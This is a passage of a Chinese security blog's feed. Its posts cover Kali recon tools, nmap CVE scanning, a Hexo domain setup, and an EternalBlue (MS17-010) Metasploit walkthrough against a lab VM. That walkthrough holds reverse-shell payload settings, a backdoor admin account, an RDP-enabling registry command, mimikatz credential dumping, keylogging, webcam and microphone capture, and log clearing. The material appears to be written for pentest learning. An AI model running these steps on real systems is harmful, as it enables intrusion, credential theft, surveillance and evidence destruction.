style="color:orangered">-D&emsp;&emsp;&emsp;&emsp;显示内置的字典，不进行扫描</label><br><label style="color:orangered">-d&emsp;&emsp;&emsp;&emsp;显示在DNS服务器上的NS(一种服务记录类型)、MX(邮件服务器)的IPV6的域名信息</label><br><label style="color:orangered">-s&emsp;&emsp;&emsp;&emsp;显示SRV(DNS记录的一种用于标识使用了某种DNS服务)服务的名称</label><br><label style="color:orangered">-[smlxu]&emsp;选择字典的大小</label><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;-s&emsp;小型=100<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;-m&emsp;中等=1419(默认值)<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;-l&emsp;&emsp;大型=2601<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;-x&emsp;&emsp;极限=5886或者16724</p>          </div><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/dnsd.png" class="lazyload"><br>但是kali上没有自带这个工具，所以我们需要手动下载安装<br><label style="color:red"><strong>直接访问下载:</strong></label><br><a href="https://src.fedoraproject.org/lookaside/pkgs/thc-ipv6/thc-ipv6-2.7.tar.gz/2975dd54be35b68c140eb2a6b8ef5e59/thc-ipv6-2.7.tar.gz" target="_blank" rel="noopener">https://src.fedoraproject.org/lookaside/pkgs/thc-ipv6/thc-ipv6-2.7.tar.gz/2975dd54be35b68c140eb2a6b8ef5e59/thc-ipv6-2.7.tar.gz</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zvxf thc-ipv6-2.7.tar.gz</span><br><span class="line">cd thc-ipv6-2.7</span><br><span class="line">sudo apt-get install libpcap-dev libssl-dev</span><br><span class="line">make</span><br><span class="line">sudo cp dnsdict6 /usr/bin/</span><br></pre></td></tr></table></figure><h1 id="theharvester网站用户信息收集"><a href="#theharvester网站用户信息收集" class="headerlink" title="theharvester网站用户信息收集"></a>theharvester网站用户信息收集</h1><p>TheHarvester能够收集电子邮件账号、用户名、主机名和子域名等信息。它通过Google、Bing、PGP、LinkedIn、Baidu、Yandex、People123、Jigsaw、Shodan等公开资源整理收集这些信息。这些信息将在后期的渗透测试阶段发挥巨大的作用。</p><p>应用示例：</p><p>我们想从百度(baidu)搜索引擎中的前200项搜索结果中挖掘目标域里的电子邮件地址和主机名，可以输入下述指令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theHarvester -d qq.com -l 200 -b baidu</span><br></pre></td></tr></table></figure><p>不一会我们就收集到了一些电子邮件账号和二级子域名，部分模块是需要翻墙的。<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/the.png" class="lazyload"></p><h1 id="sparta"><a href="#sparta" class="headerlink" title="sparta"></a>sparta</h1><p>在我们渗透的时候基本上都会用到nmap、Metasploite、sqlmap、Hydra等工具，这些工具不管是单一功能还是额外的脚本插件都很强大，有时候我们也需要多款工具组合使用，这时候集成工具的便捷性就体现出来了。  </p><p><code>Sparta</code>的功能主要包含如下:</p><ol><li><p>端口扫描，程序自动调用nmap进行扫描，根据nmap的扫描结果，nikto自动加载结果，展开更精确的扫描。</p></li><li><p>针对扫描的结果，特定使用，如：使用dirbuster目录爆破，利用webslayer进行web指纹识别。</p></li><li><p>针对可爆力破解的端口，可调用hydra进行暴力破解。</p></li></ol><p>使用方法:kali终端直接输入<code>sparta</code>就会打开软件<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/start.png" class="lazyload"><br>工具打开后点击左边hosts空白处，在弹出的窗口输入要扫描的主机段，点击Add to scope开始扫描<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/scan.png" class="lazyload"><br>扫描开始，通过(Finished/Running)判断是否扫描完毕，可以从扫描状态栏看到我们使用了nmap和nikto工具进行了自动化扫描<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/runing.png" class="lazyload"><br>扫描完毕，可以切换Hosts、Servuces、Tools栏查看主机、信息系统、服务信息以及工具扫描结果<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/hosts.png" class="lazyload"><br>在Hosts栏选择其中一个主机，可以在右侧显示更多信息:服务端口开放情况、利用脚本、基本网路信息等<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/server.png" class="lazyload"><br>接下来我们选择172.22.162.197这台虚拟机进行ssh爆破，右击目标端口，选择<code>Open with ssh client</code>，他会自动打开一个终端进行连接，我们暂时先不管<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ssh.png" class="lazyload"><br>接下来我们选择<code>Send to Burte</code>将目标端口发送至Burte功能<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/burte.png" class="lazyload"><br>设置好账号、密码、线程后点击<code>Run</code>开始爆破(账号密码可以自行自定或者加载字典)<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/loadp.png" class="lazyload"><br>如果字典强大就会爆出账号(root)密码我打码了<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ssho.png" class="lazyload"></p><h1 id="parsero探测robots文件"><a href="#parsero探测robots文件" class="headerlink" title="parsero探测robots文件"></a>parsero探测robots文件</h1><p>该工具会自动探测目标站点的robots文件并确认实际可访问性</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">parsero -u xxx.com</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/parsero.png" class="lazyload"></p><div class="note info">            <p>该工具需要用户使用apt命令下载</p>          </div><h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>dirsearch是一款目录爆破工具</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u url -e *</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/dirsearch.png" class="lazyload"><br>该软件需要自行下载:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone  https://github.com/maurosoria/dirsearch.git</span><br></pre></td></tr></table></figure><h1 id="dmitry"><a href="#dmitry" class="headerlink" title="dmitry"></a>dmitry</h1><p>dmitry可以扫描端口、从Netcraft.com获取主机信息，子域名，域名中包含的邮件地址，whois主机IP和域名信息等，为了更好的体验，请提前自备翻墙利器，否则效果会大打折扣</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dmitry [-winsepfb] [-t 0-9] [-o%host.txt]主机</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">-o</td><td align="center">将输出保存到%hosts.txt或由-o文件指定的文件</td></tr><tr><td align="center">-i</td><td align="center">对主机的IP地址执行whois查找</td></tr><tr><td align="center">-w</td><td align="center">对主机的域名执行whois查找</td></tr><tr><td align="center">-n</td><td align="center">在主机上检索Netcraft.com信息</td></tr><tr><td align="center">-s</td><td align="center">执行搜索可能的子域</td></tr><tr><td align="center">-e</td><td align="center">执行搜索可能的店址邮件地址</td></tr><tr><td align="center">-p</td><td align="center">在主机上执行TCP端口扫描(这是全连接扫描)</td></tr><tr><td align="center">-f</td><td align="center">在显示输出报告过滤端口的主机上执行TCP端口扫描</td></tr><tr><td align="center">-b</td><td align="center">读取从扫描端口接收的横幅</td></tr><tr><td align="center">-t</td><td align="center">0-9扫描TCP端口时设置TTL(默认为2)</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息收集" scheme="https://c-hasel.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="kali" scheme="https://c-hasel.github.io/tags/kali/"/>
    
      <category term="信息收集" scheme="https://c-hasel.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>使用nmap脚本扫描CVE漏洞</title>
    <link href="https://c-hasel.github.io/2019/12/12/%E5%88%A9%E7%94%A8nmap%E6%89%AB%E6%8F%8FCVE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://c-hasel.github.io/2019/12/12/%E5%88%A9%E7%94%A8nmap%E6%89%AB%E6%8F%8FCVE%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-12-12T13:43:34.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><div class="note default no-icon">            <p>nmap的一个鲜为人知的部分是NSE，即Nmap Scripting Engine，这是nmap最强大和最灵活的功能之一。他允许用户编写(和共享)简单脚本，以自动执行各种网络任务。nmap内置了全面的NSE脚本集合，用户可以轻松使用，但用户也可以使用NSE创建自定义脚本以满足他们的个性化需求。</p>          </div><p>在这里，将同时展示两个类似的预制NSE脚本，nmap-vulners和vulscan。这两个脚本在通过为特定服务（如SSH，RDP，SMB等）生成相关的CVE信息来增强Nmap的版本检测。CVE或Common Vulnerabilities and Exposures是安全研究人员使用的一种方法，可利用数据库对各个漏洞进行编码和引用。  </p><p><code>nmap-vulner</code>和<code>vulscan</code>都是用CVE来记录增强nmap的版本检测，nmap将识别扫描服务的版本信息，NSE脚本将获取该信息并生成可利于利用该服务的已知CVE，这使得查找漏洞变得更加简单。  </p><p>下面先不使用NSE脚本的nmap来探测一下，这个时候我们发现22端口只开放了ssh服务。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -p22 172.23.211.97</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/nmap/sv.png" class="lazyload"><br>这是使用NSE脚本对同一台主机进行扫描，可以看到有更多的信息被输出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV -p22 172.23.211.97</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/nmap/svs.png" class="lazyload"><br><code>nmap-vulenrs NSE</code>脚本报告了OpenSSH v7.4近两年的CVE，严重程度分别为5.0，<code>vulscan NSE</code>脚本还报告了OpenSSH v7.4相关的十几个其他漏洞  </p><p>这两个NSE脚本都能很好的显示易受攻击的服务相关的有用信息。每次使用NSE脚本时，nmap-vulners都会查询vulners exploit数据库。vulscan查询我们计算机上的本地数据库，该数据库使我们第一次下载vulscan时预先配置的。</p><h1 id="安装Nmap-vulenrs"><a href="#安装Nmap-vulenrs" class="headerlink" title="安装Nmap-vulenrs"></a>安装Nmap-vulenrs</h1><p>首先我们先cd到nmap的脚本目录<br><code>cd /usr/share/nmap/scripts/</code><br>然后克隆nmap-vulners github存储库<br><code>git clone https://github.com/vulnersCom/nmap-vulners.git</code></p><h1 id="安装Vulscan"><a href="#安装Vulscan" class="headerlink" title="安装Vulscan"></a>安装Vulscan</h1><p>安装vulsan，我们还需将Vulscan的存储库克隆到nmap的脚本目录中<br><code>git clone https://github.com/scipag/vulscan.git</code><br>vulscan使用本地存储在我们计算机上的预配置数据库。我们可以在vulscan目录的根目录中查看这些数据库。运行以下ls命令列出可用的数据库。</p><div class="note default no-icon">            <p><code>ls vulscan/*.csv</code><br>vulscan/cve.csv<br>vulscan/exploitdb.csv<br>vulscan/openvas.csv<br>vulscan/osvdb.csv<br>vulscan/scipvuldb.csv<br>vulscan/securityfocus.csv<br>vulscan/securitytracker.csv<br>vulscan/xforce.csv</p>          </div><p>为确保数据库数最新的，我们可以使用vulscan/utilities/updater/目录中的<code>updateFiles.sh</code>脚本。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /vulscan/utilities/updater/</span><br></pre></td></tr></table></figure><p>然后确保该文件有执行权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x updateFIles.sh</span><br></pre></td></tr></table></figure><p>然后执行该脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./updateFiles.sh</span><br></pre></td></tr></table></figure><p>完成后就可以使用NES脚本了</p><h1 id="使用nmap-Vulners进行扫描"><a href="#使用nmap-Vulners进行扫描" class="headerlink" title="使用nmap-Vulners进行扫描"></a>使用nmap-Vulners进行扫描</h1><p>使用NSE脚本很简单。我们所要做的就是将–script参数添加到我们的Nmap命令中，并告诉Nmap使用哪个NSE脚本。要使用nmap-vulners脚本，我们将使用以下命令。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script nmap-vulners -sV -p port ip</span><br></pre></td></tr></table></figure><p>该-sV是绝对必要的。使用-sV，我们告诉Nmap探测版本信息的目标地址。如果Nmap不生成版本信息，则nmap-vulners将没有任何数据来查询Vulners数据库。使用这些NSE脚本时始终使用-sV。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script nmap-vulners -sV -p80 ###.###.###.###</span><br></pre></td></tr></table></figure><p>下面是一个示例</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script vulscan --script-args vulscandb=exploitdb.csv -sV -p22 172.23.211.97</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/nmap/ex.png" class="lazyload"></p><h1 id="合并使用"><a href="#合并使用" class="headerlink" title="合并使用"></a>合并使用</h1><p>作为安全扫描程序，NSE脚本显着提高了Nmap的多功能性，为了充分利用Nmap的版本扫描，我们可以在一个命令中同时使用nmap-vulners和vulscan。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV -p# ###.###.###.###</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="漏洞扫描" scheme="https://c-hasel.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
    
      <category term="CVE" scheme="https://c-hasel.github.io/tags/CVE/"/>
    
      <category term="nmap" scheme="https://c-hasel.github.io/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>永恒之蓝漏洞利用+后渗透</title>
    <link href="https://c-hasel.github.io/2019/12/05/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://c-hasel.github.io/2019/12/05/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2019-12-05T15:33:00.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><ul><li><p>永恒之蓝漏洞是方程式组织在其漏洞利用框架中一个针对<strong>SMB服务</strong>进行攻击的漏洞，该漏洞导致攻击者在目标系统上<strong>可以执行任意代码</strong>。  </p></li><li><p>注:SMB服务的作用:该服务器在windows与UNIX系列OS之间搭建起一座桥梁，让两者的资源可互通有无。</p></li></ul><h2 id="漏洞原理代码详解"><a href="#漏洞原理代码详解" class="headerlink" title="漏洞原理代码详解"></a>漏洞原理代码详解</h2><p><strong>下面两篇文章从实际代码详细分析了漏洞原理，想要从代码详细理解漏洞的同学可以点击查看</strong></p><ul><li><a href="http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772" target="_blank" rel="noopener">http://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</a></li><li><a href="https://blog.csdn.net/qq_27446553/article/details/73480807" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/73480807</a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2>首先我们需要准备一台kali攻击机，IP:172.22.163.97和一台开放445端口有永恒之蓝漏洞的win7虚拟机,IP:172.22.162.210<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2>信息收集的方法有很多，我们可以使用nmap，nc等来获取被攻击机的一些版本信息，我们也可以使用kali的<a href="https://www.metasploit.com/" target="_blank" rel="noopener">metasploit</a>中的扫描模块。<h2 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h2>在kali终端中输入<code>msfconsole</code><br><img alt data-src="/img/ms17010/msf.png" class="lazyload"></li></ul><ol><li>搜索漏洞模块<br>在kali终端输入<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><img alt data-src="/img/ms17010/search.png" class="lazyload"></li><li>加载扫描模块<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure><img alt data-src="/img/ms17010/scanner.png" class="lazyload"><br>输入要扫描的IP <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 172.22.162.210</span><br><span class="line">run</span><br></pre></td></tr></table></figure>扫描结果显示该主机很容易受到ms17-010的攻击<br><img alt data-src="/img/ms17010/rhosts.png" class="lazyload"><br>如果要进行全网段扫描可以在设置目标的时候输入<code>set rhosts 网段/掩码位数</code>，再设置线程<code>set threads 100</code>就可以进行全网段扫描了。</li><li>使用攻击模块<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 172.22.162.210</span><br><span class="line"><span class="built_in">set</span> lhost 172.22.163.97</span><br><span class="line">run</span><br></pre></td></tr></table></figure>选择攻击模块时要注意选择合适的版本，有些版本适用于win8以上</li></ol><ul><li><code>set payload</code>:设置payload，这里用<code>set payload windows/x64/meterpreter/reverse_tcp</code><br>因为目标主机是64位主机，所以我们要用到的payload为windows x64,要选用其他payload可以<strong>使用show payloads查看适合要攻击的目标主机的payload</strong></li><li><code>show options</code>:使用该命令会列出使用当前模块所需要配置的参数</li><li><code>set rhosts</code>:目标主机地址:该命令会设置好需要攻击的目标主机地址</li><li><code>set lhost</code>:攻击机地址:该命令设置攻击机的地址，是目标主机回连至攻击机</li><li><code>set lport</code>:回连的端口:该命令会设置主机回连至攻击机的端口，默认为4444</li><li><code>run</code>:开始攻击</li></ul><p><strong>攻击成功后攻击机和目标主机之间会建立一个连接，得到一个meterpreter回话</strong><br><img alt data-src="/img/ms17010/run.png" class="lazyload"><br><img alt data-src="/img/ms17010/meter.png" class="lazyload"></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><ol><li>获取shell(windwos主机的cmd)<br><img alt data-src="/img/ms17010/shell.png" class="lazyload"><br>如果发现乱码输入<code>chcp 65001</code>即可改变编码</li><li>提权<br>当我们获取了shell后权限是很低的，这个时候我们就新建一个名为test的管理员，密码为123456<br><img alt data-src="/img/ms17010/admin.png" class="lazyload"></li><li>远程连接<br>打开3389端口方便我们远程连接这台主机<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br><img alt data-src="/img/ms17010/3389.png" class="lazyload"><br>新建一个终端窗口输入<code>rdesktop 172.22.162.210</code></li></ol><ul><li><code>-u</code>:指定用户名</li><li><code>-p</code>:指定密码</li><li><code>-f</code>:全屏显示<br>更多参数输入<code>rdesktop --help</code></li></ul><p>选择其他用户登录我们之前创建的test用户就可以图形化操作了<br><img alt data-src="/img/ms17010/rdesktop.png" class="lazyload"><br><img alt data-src="/img/ms17010/rdesk.png" class="lazyload"></p><p>该永恒之蓝模块只适用于64位win7和server2008<br>要是现在有一台存在漏洞的32位2003系统该怎么办<br>这里我们就需要用到永恒之蓝的另一个模块<br><code>use exploit/windows/smb/ms17_010_psexec</code><br>这个模块支持server2003这样的老系统并支持32位系统<br><code>set payload windows/meterpreter/bind_tcp</code></p><h1 id="msf后渗透"><a href="#msf后渗透" class="headerlink" title="msf后渗透"></a>msf后渗透</h1><p>返回Metasploit继续操作<br>在之前的shell界面输入exit<br><img alt data-src="/img/ms17010/exit.png" class="lazyload"></p><ul><li>查看用户密码<ol><li>加载mimikatz:<code>laod mimikatz</code></li><li>获取明文密码:<code>kerberos</code>，如果开机没使用密码kerberos是抓取不到的，也可以用<code>wdigest</code></li></ol></li></ul><p><img alt data-src="/img/ms17010/mimikatz.png" class="lazyload"><br><strong>如果在提权之前用kerberos获取到内存中的管理员密码可以减少提权这一步哦</strong></p><ul><li><code>getuid</code>查看当前用户</li></ul><p><img alt data-src="/img/ms17010/uid.png" class="lazyload"></p><ul><li><code>sysinfo</code>查看系统信息</li></ul><p><img alt data-src="/img/ms17010/sys.png" class="lazyload"></p><ul><li><code>ifconfig</code>查看网卡信息</li></ul><p><img alt data-src="/img/ms17010/network.png" class="lazyload"></p><ul><li><code>ps</code>查看任务管理器</li></ul><p><img alt data-src="/img/ms17010/ps.png" class="lazyload"></p><ul><li><code>hashdump</code>查看用户hash</li></ul><p><img alt data-src="/img/ms17010/hash.png" class="lazyload"></p><ul><li>监听键盘记录<br>首先我们要迁移到对应用户的进程上<br>先用ps查看下进程</li></ul><p><img alt data-src="/img/ms17010/ps2.png" class="lazyload"><br>我们发现administrator的进程为1968<br><code>migrate 1968</code><br>将进程迁移到administrator进程上<br><code>getuid</code>查看当前用户已经切换到了administrator<br><img alt data-src="/img/ms17010/1986.png" class="lazyload"><br><code>keyscan_start</code><br>开始监听键盘记录<br>这时我们模拟一下登录qq邮箱<br><code>keyscan_dump</code><br>查看监听的键盘记录<br><img alt data-src="/img/ms17010/key.png" class="lazyload"><br>通过监听键盘记录发现主机访问了qq邮箱输入了qq号:te退格退格123456和密码:test123tabtest132<br><code>keyscan_stop</code><br>停止键盘监听</p><ul><li><p><code>uictl</code>键盘/鼠标开关<strong>必须要32位主机</strong></p><ul><li><code>uictl enable/disable keyboard</code>开启或禁用键盘</li><li><code>uictl enable/disable mouse</code>开启或禁用鼠标</li><li><code>uictl enable/disable all</code>开启或禁用键盘鼠标</li></ul></li><li><p><code>webcam</code>查看摄像头</p><ul><li><code>webcam_list</code>:查看摄像头列表</li><li><code>webcam_snap</code>:通过摄像头拍照</li><li><code>webcam_stream</code>:通过摄像头开启视频<br>由于我是虚拟机，检测不到摄像头驱动。</li></ul></li><li><p><code>execute</code>执行文件</p><ul><li><code>execute -f</code>执行制定文件</li><li><code>execute -H -i -f cmd.exe</code>创建新的cmd，-H不可见，-i交互</li></ul></li></ul><p><img alt data-src="/img/ms17010/execute.png" class="lazyload"></p><ul><li><code>screenshot</code>:截屏</li><li><code>screenshare</code>:查看实时共享屏幕<center>左边为攻击机，右边为被攻击主机</center></li></ul><div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"hotkey":true,"mutex":true,"video":{"url":"/img/ms17010/share.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><ul><li><code>record_mic</code>:记录声音</li><li><code>clearev</code>:清理日志</li></ul><div class="note warning">            <p><strong>严重声明</strong>：本站内容仅适于网络安全技术和信息安全爱好者学习研究使用，禁止用于非法用途，学习中请遵循国家相关法律法规，共同维护网络安全</p>          </div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="漏洞利用" scheme="https://c-hasel.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="windows" scheme="https://c-hasel.github.io/tags/windows/"/>
    
      <category term="系统漏洞" scheme="https://c-hasel.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客搭建三:自定义域名绑定githu+coding</title>
    <link href="https://c-hasel.github.io/2019/12/02/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%89/"/>
    <id>https://c-hasel.github.io/2019/12/02/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%89/</id>
    <published>2019-12-03T04:18:36.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note info no-icon">            <p>当我们搭建好自己的博客以及配置好主题后，我们就要往里面写文章了，但是我们发现，域名很长一串不好记，而且每次访问自己的博客的时候总是加载的很慢，那是因为github是国外的网站，当国内的用户访问的时候不开代理就对我们不是很友好。那么今天我们就来解决这个问题</p>          </div><h1 id="设置个人域名"><a href="#设置个人域名" class="headerlink" title="设置个人域名"></a>设置个人域名</h1><p>既然我们访问国外的网站慢，那么我们就在国内的平台上部署我们的博客。</p><h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>首先我们得有自己的域名，没有真么办？那我们就买一个，<a href="https://dnspod.cloud.tencent.com/" target="_blank" rel="noopener">腾讯云</a>和<a href="https://www.aliyun.com/" target="_blank" rel="noopener">万网</a>的都可以  </p><p>首先注册腾讯云或者万网的账号，再购买自己喜欢的域名。</p><h1 id="hexo部署到coding服务器"><a href="#hexo部署到coding服务器" class="headerlink" title="hexo部署到coding服务器"></a>hexo部署到coding服务器</h1><ol><li>首先在<a href="https://dev.tencent.com/" target="_blank" rel="noopener">coding</a>上注册账号，然后新建一个项目，项目必须填:<font color="Blue">你的用户名.coding.me</font>。<br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/new.png" class="lazyload"></li><li>导入公钥，可以用之前生成github的公钥<br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/rsa.png" class="lazyload"></li><li>修改hexo根目录下的<code>_config.yml</code>的deploy如下:<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span></span><br><span class="line">    <span class="attr">github:</span> <span class="string">git@github.com:yourname/yourname.github.io.git</span></span><br><span class="line">    <span class="attr">coding:</span> <span class="string">git@e.coding.net:yourname/yourname.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></li><li>把本地文件上传到coding上<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>这个时候我们已经看到我们的配置文件已经上传上来了<br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/up.png" class="lazyload"></li><li>选择构建与部署中的<strong>静态网站</strong>，实名认证过后就可以发布我们的博客了<br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/d.png" class="lazyload"><br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/s.png" class="lazyload"></li></ol><h1 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h1><h2 id="coding域名绑定"><a href="#coding域名绑定" class="headerlink" title="coding域名绑定"></a>coding域名绑定</h2><div class="note info no-icon">            <p>当我们部署好后会给我们一串很长的域名，这个时候就需要把我们购买的域名解析到这个域名上</p>          </div><p>在万网或者腾讯云的域名解析设置中添加记录  </p><p>添加两条记录类型为<code>CNAME</code>，主机类型分别为<code>www</code>和<code>@</code>，记录值为coding给你的很长一串的域名，注意不要http<br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/jx1.png" class="lazyload"><br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/jx2.png" class="lazyload"><br>然后在coding的静态网站中选择设置，添加域名<br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/bd.png" class="lazyload"></p><div class="note warning">            